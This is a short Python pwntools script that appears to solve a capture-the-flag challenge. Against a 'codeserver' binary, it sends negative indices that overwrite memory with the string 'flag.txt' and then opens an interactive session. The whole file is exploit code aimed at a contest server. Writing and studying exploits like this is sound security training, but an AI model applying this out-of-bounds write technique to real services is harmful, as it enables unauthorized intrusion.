#!/usr/bin/env python
from pwn import *
from functools import wraps
import itertools

context.log_level = 'DEBUG'
e = ELF('./codeserver')
r = None

LOCAL = False

def main():
    global r
    env = { }
    if LOCAL:
        r = process('./codeserver', env=env)
        #gdb.attach(r, '''b *0x080488dd
        #c'''.format())
    
    else:
        r = remote("challenge.acictf.com", 14000)
    r.recvuntil("Quit")
    r.sendline("2")
    r.sendline(str(-0x3ff))
    r.sendline(str(u32("flag")))
    r.sendline("2")
    r.sendline(str(-0x3fe))
    r.sendline(str(u32(".txt")))
    r.sendline("2")
    r.sendline(str(-0x3fd))
    r.sendline(str(u32("\x00\x00\x00\x00")))
    r.interactive()

if __name__ == '__main__':
    main()
